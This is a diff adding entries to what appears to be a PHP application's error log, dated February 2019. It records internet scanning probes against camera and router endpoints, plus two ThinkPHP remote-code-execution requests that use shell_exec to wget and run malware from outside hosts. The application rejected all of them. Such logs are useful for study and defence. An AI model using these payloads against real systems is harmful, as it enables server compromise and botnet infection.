@@ -1,0 +1,12 @@
+[ 2019-02-01T00:10:32+08:00 ] 221.165.43.239 /onvif-http/snapshot?auth=YWRtaW46MTEK
+ERR: 无法加载控制器:Onvif-http
+
+[ 2019-02-01T07:53:39+08:00 ] 147.135.64.56 //webfig/
+ERR: 无法加载控制器:Webfig
+
+[ 2019-02-01T10:27:46+08:00 ] 185.244.25.128 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.club/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
+ERR: 非法操作:\think\app
+
+[ 2019-02-01T15:52:19+08:00 ] 185.172.110.88 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://185.244.25.159/Corona.x86_64;%20chmod%20777%20Corona.x86_64;./Corona.x86_64%20thinkphp
+ERR: 非法操作:\think\app
+
